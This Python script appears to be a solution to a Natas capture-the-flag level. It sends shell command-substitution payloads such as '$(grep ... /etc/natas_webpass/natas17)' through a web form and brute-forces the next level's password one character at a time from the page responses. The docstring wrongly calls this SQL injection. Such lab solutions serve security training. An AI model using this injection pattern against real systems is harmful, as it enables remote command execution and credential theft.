import requests

import utils

LEVEL = 16
ASCII_CHARS = utils.ASCII_CHARS


def send_payload(session, url, auth, payload):
    data = {'needle': payload}
    return session.post(url, auth=auth, data=data)


def obtain_password_chars(session, url, auth):
    """ sql injection that determines each character in the password """
    password = ''
    for char in ASCII_CHARS:
        payload = f"doomed$(grep {char} /etc/natas_webpass/natas17)"
        r = send_payload(session, url, auth, payload)
        print(char, end=' ')
        if 'doomed' not in r.text:
            password += char
            print('password chars: ', password)
    return password


def retrieve_password(session, url, auth, password_chars_file):
    """ tests the order of each character from obtain_password_chars(...)
    and determines the actual password """
    password = ''
    while len(password) < 32:
        password_chars = utils.read_file(password_chars_file)
        for char in password_chars:
            print(char, end=' ')
            payload = f"doomed$(grep ^{password + char} /etc/natas_webpass/natas17)"
            r = send_payload(session, url, auth, payload)
            if 'doomed' not in r.text:
                password += char
                print(f"Current password: {password}")
                break
    return password


def main():
    username, password, url, auth = utils.get_natas_credentials(LEVEL)
    password_chars_file = 'password_characters.txt'
    with requests.Session() as session:
        if utils.is_file_missing_or_empty(password_chars_file):
            obtained_password_chars = obtain_password_chars(session, url, auth)
            utils.save_file(password_chars_file, obtained_password_chars)
        password = retrieve_password(session, url, auth, password_chars_file)
        utils.save_file('out.txt', password)


if __name__ == "__main__":
    main()